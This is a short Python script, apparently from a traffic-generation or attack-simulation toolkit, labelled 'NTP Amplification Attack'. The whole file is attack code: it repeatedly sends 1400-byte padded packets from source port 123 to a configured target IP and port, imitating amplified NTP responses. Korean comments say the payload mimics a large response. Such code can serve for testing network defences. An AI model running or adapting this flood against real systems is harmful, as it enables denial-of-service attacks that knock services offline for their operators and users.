from config import TARGET_IP, DEFAULT_TARGET_PORT, DEFAULT_COUNT, DEFAULT_INTERVAL
import time
from tqdm import tqdm

from .amplification_common import send_amp_random_packet

NAME = "NTP Amplification Attack"

def run():
    payload = b"A" * 1400   # 큰 응답을 흉내

    # Count만큼 패킷을 보내고, Interval만큼 대기
    for _ in tqdm(range(DEFAULT_COUNT)):
        send_amp_random_packet(TARGET_IP, DEFAULT_TARGET_PORT, 123, payload)
        time.sleep(DEFAULT_INTERVAL)

if __name__ == "__main__":
    run()
